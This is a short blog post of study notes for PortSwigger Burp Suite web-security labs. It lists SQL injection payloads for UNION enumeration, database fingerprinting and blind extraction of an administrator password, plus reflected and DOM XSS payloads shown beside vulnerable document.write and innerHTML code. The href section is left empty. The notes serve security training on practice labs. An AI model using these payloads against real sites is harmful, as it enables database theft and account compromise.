---
title: BurpSuite Lab
author: Yuchao
date: 2022-05-10 11:33:00 +0800
categories: [sec]
tags: [burpsuite]
math: true
mermaid: true
---

# sql injection

#### cheetsheet
<https://portswigger.net/web-security/sql-injection/cheat-sheet>

```
'+OR+1=1--
'+UNION+SELECT+NULL,NULL--

-- find columns are compatible with string data
'+UNION+SELECT+'abcdef',NULL,NULL--

-- oracle, find database type and version
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

-- mysql, find database type and verion
'+UNION+SELECT+'abc','def'#
'+UNION+SELECT+@@version,+NULL#

-- list database contents, not oracle
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

-- list database contents, oracle
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

-- blind, conditional responses
-- "Welcome back" message disappears if error
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

```

# Cross-site scripting

#### Reflected XSS
- url ``` web-security-academy.net/?search=<script>alert%281%29<%2Fscript> ```
- ``` <script> alert(1) </script>```

#### DOM XSS
- "View source" option won't work for DOM XSS testing 


document.write
```js
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	trackSearch(query);
}
```
- ``` "><svg onload=alert(1)> ```


innerHTML
```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}

```
- ``` <img src=1 onerror=alert(1)> ```


href attribute
```javascript

```
- ```  ```

